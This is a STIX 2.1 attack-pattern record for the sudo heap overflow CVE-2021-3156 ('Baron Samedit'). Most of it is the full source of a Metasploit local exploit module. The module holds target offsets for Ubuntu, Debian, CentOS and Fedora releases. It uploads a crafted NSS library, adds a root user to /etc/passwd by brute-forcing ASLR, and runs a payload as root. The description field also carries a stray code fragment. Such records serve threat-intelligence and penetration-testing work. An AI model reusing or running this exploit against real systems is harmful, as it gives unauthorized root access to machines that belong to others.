{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ea782559-bd37-464f-9fd6-4b15fb746c56",
    "created": "2024-08-14T16:59:12.570744Z",
    "modified": "2024-08-14T16:59:12.570749Z",
    "name": "Sudo Heap-Based Buffer Overflow",
    "description": " A heap based buffer overflow exists in the sudo command line utility that can be exploited by a local attacker to gain elevated privileges. The vulnerability was introduced in July of 2011 and affects version 1.8.2 through 1.8.31p2 as well as 1.9.0 through 1.9.5p1 in their default configurations. The technique used by this implementation leverages the overflow to overwrite a service_user struct in memory to reference an attacker controlled library which results in it being loaded with the elevated privileges held by sudo.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/sudo_baron_samedit.rb",
            "external_id": "sudo_baron_samedit.rb"
        },
        {
            "source_name": "reference",
            "url": "https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit"
        },
        {
            "source_name": "reference",
            "url": "https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt"
        },
        {
            "source_name": "reference",
            "url": "https://www.kalmarunionen.dk/writeups/sudo/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/blasty/CVE-2021-3156/blob/main/hax.c"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-3156"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'digest/sha2'\nrequire 'tempfile'\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Post::File\n  include Msf::Post::Unix\n  include Msf::Post::Linux::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Sudo Heap-Based Buffer Overflow',\n        'Description' => %q{\n          A heap based buffer overflow exists in the sudo command line utility that can be exploited by a local attacker\n          to gain elevated privileges. The vulnerability was introduced in July of 2011 and affects version 1.8.2\n          through 1.8.31p2 as well as 1.9.0 through 1.9.5p1 in their default configurations. The technique used by this\n          implementation leverages the overflow to overwrite a service_user struct in memory to reference an attacker\n          controlled library which results in it being loaded with the elevated privileges held by sudo.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Qualys', # vulnerability discovery and analysis\n          'Spencer McIntyre',                  # metasploit module\n          'bwatters-r7',                       # metasploit module\n          'smashery',                          # metasploit module\n          'blasty <blasty@fail0verflow.com>',  # original PoC\n          'worawit',                           # original PoC\n          'Alexander Krog'                     # detailed vulnerability analysis and exploit technique\n        ],\n        'SessionTypes' => ['shell', 'meterpreter'],\n        'Platform' => ['unix', 'linux'],\n        'References' => [\n          ['URL', 'https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit'],\n          ['URL', 'https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt'],\n          ['URL', 'https://www.kalmarunionen.dk/writeups/sudo/'],\n          ['URL', 'https://github.com/blasty/CVE-2021-3156/blob/main/hax.c'],\n          ['CVE', '2021-3156'],\n        ],\n        'Targets' => [\n          [ 'Automatic', {} ],\n          [ 'Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)', { exploit_script: 'nss_generic1', exploit_params: [ 56, 54, 63, 212 ], exploit_technique: 'nss', lib_needs_space: true, version_fingerprint: /^Ubuntu 20\\.04/ } ],\n          [ 'Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31) - alternative', { exploit_script: 'nss_generic2', exploit_params: [ ], exploit_technique: 'nss', lib_needs_space: false, version_fingerprint: /^Ubuntu 20\\.04/ } ],\n          [ 'Ubuntu 19.04 x64 (sudo v1.8.27, libc v2.29)', { exploit_script: 'nss_generic1', exploit_params: [ 56, 54, 63, 212 ], exploit_technique: 'nss', lib_needs_space: true, version_fingerprint: /^Ubuntu 19\\.04/ } ],\n          [ 'Ubuntu 18.04 x64 (sudo v1.8.21, libc v2.27)', { exploit_script: 'nss_generic1', exploit_params: [ 56, 54, 63, 212 ], exploit_technique: 'nss', lib_needs_space: true, version_fingerprint: /^Ubuntu 18\\.04/ } ],\n          [ 'Ubuntu 18.04 x64 (sudo v1.8.21, libc v2.27) - alternative', { exploit_script: 'nss_generic2', exploit_params: [ ], exploit_technique: 'nss', lib_needs_space: false, version_fingerprint: /^Ubuntu 18\\.04/ } ],\n          [ 'Ubuntu 16.04 x64 (sudo v1.8.16, libc v2.23)', { exploit_script: 'nss_u16', exploit_params: [ ], exploit_technique: 'nss', lib_needs_space: false, version_fingerprint: /^Ubuntu 16\\.04/ } ],\n          [ 'Ubuntu 14.04 x64 (sudo v1.8.9p5, libc v2.19)', { exploit_script: 'nss_u14', exploit_params: [ ], exploit_technique: 'nss', lib_needs_space: false, version_fingerprint: /^Ubuntu 14\\.04/ } ],\n          [ 'Debian 10 x64 (sudo v1.8.27, libc v2.28)', { exploit_script: 'nss_generic1', exploit_params: [ 64, 49, 60, 214 ], exploit_technique: 'nss', lib_needs_space: true, version_fingerprint: %r{^Debian GNU/Linux 10$} } ],\n          [ 'Debian 10 x64 (sudo v1.8.27, libc v2.28) - alternative', { exploit_script: 'nss_generic2', exploit_params: [ ], exploit_technique: 'nss', lib_needs_space: false, version_fingerprint: %r{^Debian GNU/Linux 10$} } ],\n          [ 'CentOS 8 x64 (sudo v1.8.25p1, libc v2.28)', { exploit_script: 'nss_generic2', exploit_params: [ ], exploit_technique: 'nss', lib_needs_space: false, version_fingerprint: /^CentOS Linux release 8/ } ],\n          [ 'CentOS 7 x64 (sudo v1.8.23, libc v2.17)', { exploit_script: 'userspec_c7', exploit_technique: 'userspec', version_fingerprint: /^CentOS Linux release 7/ } ],\n          [ 'CentOS 7 x64 (sudo v1.8.23, libc v2.17) - alternative', { exploit_script: 'userspec_generic', exploit_technique: 'userspec', version_fingerprint: /^CentOS Linux release 7/ } ],\n          [ 'Fedora 27 x64 (sudo v1.8.21p2, libc v2.26)', { exploit_script: 'userspec_generic', exploit_technique: 'userspec', version_fingerprint: /^Fedora release 27/ } ],\n          [ 'Fedora 26 x64 (sudo v1.8.20p2, libc v2.25)', { exploit_script: 'userspec_generic', exploit_technique: 'userspec', version_fingerprint: /^Fedora release 26/ } ],\n          [ 'Fedora 25 x64 (sudo v1.8.18, libc v2.24)', { exploit_script: 'userspec_generic', exploit_technique: 'userspec', version_fingerprint: /^Fedora release 25/ } ],\n          [ 'Fedora 24 x64 (sudo v1.8.16, libc v2.23)', { exploit_script: 'userspec_generic', exploit_technique: 'userspec', version_fingerprint: /^Fedora release 24/ } ],\n          [ 'Fedora 23 x64 (sudo v1.8.14p3, libc v2.22)', { exploit_script: 'userspec_generic', exploit_technique: 'userspec', version_fingerprint: /^Fedora release 23/ } ],\n          [ 'Manual', { exploit_script: 'nss_generic1', exploit_technique: 'nss', lib_needs_space: true } ],\n        ],\n        'DefaultTarget' => 0,\n        'Arch' => ARCH_X64,\n        'DefaultOptions' => { 'PrependSetgid' => true, 'PrependSetuid' => true, 'WfsDelay' => 10 },\n        'DisclosureDate' => '2021-01-26',\n        'Notes' => {\n          'AKA' => [ 'Baron Samedit' ],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],\n          'Reliability' => [REPEATABLE_SESSION],\n          'Stability' => [CRASH_SAFE]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('WritableDir', [ true, 'A directory where you can write files.', '/tmp' ])\n    ])\n\n    register_advanced_options([\n      OptString.new('Lengths', [ false, 'The lengths to set as used by the manual target. (format: #,#,#,#)' ], regex: /(\\d+(, *| )){3}\\d+/, conditions: %w[TARGET == Manual]),\n      OptString.new('NewUser', [ false, 'A username to add as root (if required by exploit target)', 'msf' ], regex: /^[a-z_]([a-z0-9_-]{0,31}|[a-z0-9_-]{0,30}\\$)$/),\n      OptString.new('NewPassword', [ false, 'A password to add for NewUser (if required by exploit target)' ]),\n    ])\n\n    deregister_options('COMPILE')\n  end\n\n  # A password hash that we have confidence that we have inserted into /etc/passwd\n  @inserted_password_hash = nil\n\n  def get_versions\n    versions = {}\n    output = cmd_exec('sudo --version')\n    if output\n      version = output.split(\"\\n\").first.split(' ').last\n      versions[:sudo] = version if version =~ /^\\d/\n    end\n\n    versions\n  end\n\n  def check\n    sudo_version = get_versions[:sudo]\n    return CheckCode::Unknown('Could not identify the version of sudo.') if sudo_version.nil?\n\n    # fixup the p number used by sudo to be compatible with Rex::Version\n    sudo_version.gsub!(/p/, '.')\n\n    vuln_builds = [\n      [Rex::Version.new('1.8.2'), Rex::Version.new('1.8.31.2')],\n      [Rex::Version.new('1.9.0'), Rex::Version.new('1.9.5.1')],\n    ]\n\n    if sudo_version == '1.8.31'\n      # Ubuntu patched it as version 1.8.31-1ubuntu1.2 which is reported as 1.8.31\n      return CheckCode::Detected(\"sudo #{sudo_version} may be a vulnerable build.\")\n    end\n\n    if vuln_builds.any? { |build_range| Rex::Version.new(sudo_version).between?(*build_range) }\n      return CheckCode::Appears(\"sudo #{sudo_version} is a vulnerable build.\")\n    end\n\n    CheckCode::Safe(\"sudo #{sudo_version} is not a vulnerable build.\")\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    write_file path, data\n    register_file_for_cleanup(path)\n  end\n\n  def get_automatic_targets\n    sysinfo = get_sysinfo\n\n    selected_targets = targets.each_index.select { |index| targets[index].opts[:version_fingerprint]&.match(sysinfo[:version]) }\n    fail_with(Failure::NoTarget, 'Failed to automatically identify the target.') if selected_targets.empty?\n    selected_targets\n  end\n\n  def find_exec_program\n    return 'python' if command_exists?('python')\n    return 'python3' if command_exists?('python3')\n\n    return false\n  end\n\n  def exploit\n    if target.name == 'Automatic'\n      resolved_indices = get_automatic_targets\n      resolved_target = targets[resolved_indices[0]]\n      print_status(\"Using automatically selected target: #{resolved_target.name}\")\n    else\n      resolved_target = target\n    end\n\n    case resolved_target[:exploit_technique]\n    when 'nss'\n      exploit_nss(resolved_target)\n    when 'userspec'\n      exploit_userspec(resolved_target)\n    end\n\n    do_post_exploit_checks\n  end\n\n  def do_post_exploit_checks\n    # Just wait a bit; this should come in real fast if it's going to though\n    4.times do |_i|\n      Rex.sleep(0.5)\n      # break if we get the shell\n      break if session_created?\n    end\n\n    # Now that everything's done, if we completed the exploit but didn't get a session, inform the user if there are other options available to them\n    if !session_created? && (target.name == 'Automatic') && !@inserted_password_hash\n      resolved_indices = get_automatic_targets\n      if resolved_indices.length > 1\n        print_status('')\n        print_status('Alternative exploit target(s) exist for this OS version:')\n        resolved_indices[1..].each { |index| print_status(\"#{index}: #{targets[index].name}\") }\n        print_status('Run `set target <id>` to select an alternative exploit script')\n      end\n    end\n\n    if @inserted_password_hash && !session_created?\n      print_warning('/etc/passwd overwritten, but no session created.')\n      print_warning('Manual cleanup of the new user in the /etc/passwd file is required.')\n      print_warning('Take note of the username and password above - these should work to manually escalate privileges.')\n    end\n  end\n\n  def on_new_session(new_session)\n    super\n    # userspec exploits edited /etc/passwd; now that we have a root shell, we can clean that up\n\n    if @inserted_password_hash\n      # We added a line to /etc/passwd\n      print_status('Cleaning up /etc/passwd')\n      tf = Tempfile.new('meterp')\n      tf_out = Tempfile.new('meterp')\n      temp_path = tf.path\n      new_session.fs.file.download_file(temp_path, '/etc/passwd')\n      pw = @inserted_password_hash.to_s\n      begin\n        f_in = File.open(temp_path, 'rb')\n        f_out = File.open(tf_out.path, 'wb')\n        f_in.each_line do |line|\n          unless line.include?(pw)\n            f_out.write(line)\n          end\n        end\n      ensure\n        f_out.close\n        f_in.close\n      end\n\n      new_session.fs.file.upload_file('/etc/passwd', tf_out.path)\n\n      begin\n        ::File.delete(temp_path)\n      rescue StandardError\n        nil\n      end\n      begin\n        ::File.delete(tf_out.path)\n      rescue StandardError\n        nil\n      end\n    end\n  end\n\n  def exploit_nss(resolved_target)\n    if target.name == 'Manual'\n      fail_with(Failure::BadConfig, 'The \"Lengths\" advanced option must be specified for the manual target') if datastore['Lengths'].blank?\n      exploit_params = datastore['Lengths'].gsub(/,/, ' ').gsub(/  +/, ' ')\n    else\n      exploit_params = resolved_target[:exploit_params].join(' ')\n    end\n\n    python_binary = find_exec_program\n\n    fail_with(Failure::NotFound, 'The python binary was not found') unless python_binary\n\n    vprint_status(\"Using '#{python_binary}' to run exploit\")\n    exploit_script = resolved_target[:exploit_script]\n    space = resolved_target[:lib_needs_space] ? ' ' : ''\n\n    path = datastore['WritableDir']\n\n    overwrite_path = rand_overwrite_path # the part that is overwritten in memory to construct the full path\n    lib_file_path = \"libnss_#{overwrite_path}#{space}.so.2\" # the full path\n\n    python_script_name = rand_text_alphanumeric(5..10) + '.py'\n    upload(\"#{path}/#{python_script_name}\", exploit_data('CVE-2021-3156', \"#{exploit_script}.py\"))\n    register_files_for_cleanup(\"#{path}/#{python_script_name}\")\n    mkdir(\"#{path}/#{lib_file_path.rpartition('/').first}\")\n    upload(\"#{path}/#{lib_file_path}\", generate_payload_dll)\n    cmd = \"#{python_binary} #{path}/#{python_script_name} #{exploit_params} #{overwrite_path} #{path}\"\n    vprint_status(\"Running #{cmd}\")\n    cmd_exec(cmd)\n  end\n\n  def exploit_userspec(resolved_target)\n    fail_with(Failure::BadConfig, 'The \"NewUser\" advanced option must be specified for this target') if datastore['NewUser'].blank?\n\n    python_binary = find_exec_program\n    fail_with(Failure::NotFound, 'The python binary was not found') unless python_binary\n    vprint_status(\"Using '#{python_binary}' to run exploit\")\n\n    exploit_script = resolved_target[:exploit_script]\n    new_user = datastore['NewUser']\n    new_password = datastore['NewPassword']\n    new_password ||= rand_text_alpha_lower(15)\n\n    # Verify that user doesn't already exist (otherwise exploit will succeed but password won't work)\n    users = get_users\n    user_exists = users.map { |u| u[:name] }.include? new_user\n\n    fail_with(Failure::BadConfig, \"#{new_user} already exists on target system\") if user_exists\n\n    password_hash = new_password.crypt('$6$' + rand(36**8).to_s(36))\n\n    path = datastore['WritableDir']\n\n    python_script_name = rand_text_alphanumeric(5..10) + '.py'\n    upload(\"#{path}/#{python_script_name}\", exploit_data('CVE-2021-3156', \"#{exploit_script}.py\"))\n    register_files_for_cleanup(\"#{path}/#{python_script_name}\")\n    cmd = \"#{python_binary} #{path}/#{python_script_name} #{new_user} '#{password_hash}'\"\n    vprint_status(\"Running #{cmd}\")\n    print_status(\"A successful exploit will create a new root user #{new_user} with password #{new_password}\")\n    print_status('Brute forcing ASLR (can take several minutes)...')\n    output = cmd_exec(cmd, nil, 600)\n    if /Success at/ =~ output\n      @inserted_password_hash = password_hash\n      print_good(\"Success! Created new user #{new_user} with password #{new_password}\")\n      elf_name = rand_text_alphanumeric(5..10)\n      uploaded_path = \"#{path}/#{elf_name}\"\n      upload(uploaded_path, generate_payload_exe)\n      chmod(uploaded_path, 0o555)\n      cmd_exec(\"/bin/bash -c \\\"echo #{new_password} | su #{new_user} -c #{uploaded_path}&\\\"\")\n    elsif /Brute force failed/ =~ output\n      print_error('Brute force failed. This can occur 2% of the time even when vulnerable.')\n    else\n      print_error('Exploit failed - unlikely to succeed')\n    end\n  end\n\n  def rand_overwrite_path\n    length = 6\n    split_pos = rand(length)\n    \"#{rand_text_alphanumeric(split_pos)}/#{rand_text_alphanumeric(length - split_pos)}\"\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-01-26",
    "x_mitre_platforms": [
        "['unix', 'linux']"
    ]
}